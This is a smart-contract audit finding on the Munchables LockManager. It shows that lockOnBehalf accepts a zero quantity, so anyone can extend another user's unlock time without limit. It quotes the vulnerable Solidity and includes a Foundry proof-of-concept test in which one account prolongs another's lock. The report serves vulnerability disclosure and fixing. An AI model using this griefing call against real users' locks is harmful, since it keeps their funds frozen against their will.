# Vulnerability details

## Impact
Users' lock can be extended perpetually thus, locking the funds longer than they initially expect.
## Proof-of-Concept
Whenever users lock a new quantity of token to their own lock, the `unlockTime` will be extended for `lockDuration` period. 

https://github.com/code-423n4/2024-05-munchables/blob/main/src/managers/LockManager.sol#L382-L384
```
lockedToken.unlockTime =
    uint32(block.timestamp) +
    uint32(_lockDuration);
```

However, there is another function `lockOnBehalf` that allows anyone to lock zero or more token to other users' lock. 
https://github.com/code-423n4/2024-05-munchables/blob/main/src/managers/LockManager.sol#L275-L293
```
function lockOnBehalf(
        address _tokenContract,
        uint256 _quantity,
        address _onBehalfOf
    )
    external
    payable
    notPaused
    onlyActiveToken(_tokenContract)
    onlyConfiguredToken(_tokenContract)
    nonReentrant
{
    address tokenOwner = msg.sender;
    address lockRecipient = msg.sender;
    if (_onBehalfOf != address(0)) {
        lockRecipient = _onBehalfOf;
    }

    _lock(_tokenContract, _quantity, tokenOwner, lockRecipient);
}
```
Anyone can call this function with zero quantity, spend some gas (which would be negligible on Blast L2), and extend other users' lock.

**Test for PoC**
Please add this test file in `/src/test/` directory and run `forge test --match-contract MrLocker -vv`
`Locker.t.sol`
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {console} from "forge-std/console.sol";
import "./MunchablesTest.sol";
import "../managers/MigrationManager.sol";
import "../libraries/MunchablesCommonLib.sol";

contract MrLocker is MunchablesTest {
    address alice = makeAddr("alice");
    address adam = makeAddr("adam");
    function test_Locker() public {
        deployContracts();
        console.log("[>] time at start of the universe: %s", block.timestamp);
        console.log("[>] alice is locking her lock");
        vm.deal(alice, 100e18);
        vm.startPrank(alice);
        amp.register(MunchablesCommonLib.Realm.Everfrost, address(this));
        lm.lock{value: 1.1e18}(
            address(0),
            1.1e18
        );
        vm.stopPrank();
        console.log("[>] alice's unlockTime: %s", lm.getLocked(alice)[0].lockedToken.unlockTime);
        console.log("[>] warping to the next point in time, just before alice's unlocktime");
        vm.warp(lm.getLocked(alice)[0].lockedToken.unlockTime - 1);
        console.log("[>] current time of the universe: %s", block.timestamp);
        vm.startPrank(adam);
        console.log("[>] adam is locking on behalf of alice");
        lm.lockOnBehalf(
            address(0),
            0,
            alice
        );
        vm.stopPrank();
        console.log("[>] alice's unlockTime after adam locked on her behalf: %s", lm.getLocked(alice)[0].lockedToken.unlockTime);
    }
}
```
